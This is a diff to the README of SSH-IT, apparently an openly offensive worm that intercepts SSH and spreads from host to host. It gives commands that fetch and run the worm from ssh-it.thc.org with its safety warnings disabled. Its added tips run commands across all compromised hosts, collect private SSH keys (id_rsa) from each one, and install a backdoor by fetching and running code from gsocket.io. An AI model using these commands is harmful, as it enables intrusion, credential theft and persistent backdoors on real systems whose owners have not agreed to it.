@@ -36,6 +36,8 @@ If you know about this then consider yourself special. Join us on [Telegram](htt
 ALPHA DEFAULT SETTINGS:
 * ```THC_VERBOSE=1``` Display a warning when *ssh* is being intercepted (in bold red).
 * ```THC_DEPTH=2``` The worm will not spread further than 2 hops away from the current host.
+* ```THC_DEBUG=1``` Display debug information.
+* ```THC_DEBUG_LOG=thc.log``` Output (most) debug information to ```thc.log```.
 
 {:refdef: style="text-align: center;"}
 ![Verbose-Example](verbose-example.png)
@@ -46,12 +48,24 @@ Take off all safety and run SSH-IT in release mode (*with no warnings*):
 THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 
-Or go bonkers and let the worm run until the Internet runs out of hosts to own:
-```shell
-THC_DEPTH=9999 THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
-```
 ### Tips & Tricks
+#### Remote Command Execution
+Executing a command on _all_ hosts
+```
+~/.prng/thc_cli -r exec 'id'
+```
 
+Retrieve the private SSH key (```id_rsa```) from _all_ hosts:
+```
+~/.prng/thc_cli -r exec 'cat .ssh/id_rsa 2>/dev/null'
+```
+
+Install a backdoor on _all_ hosts:
+```
+~/.prng/thc_cli -r exec 'bash -c "$(curl -fsSL gsocket.io/x)"'
+```
+
+#### When HTTPS is not available
 Deploy from a self-extracting shell-script [ssh-it-deploy.sh](http://nossl.segfault.net/ssh-it-deploy.sh):
 ```shell
 # Without HTTPS 
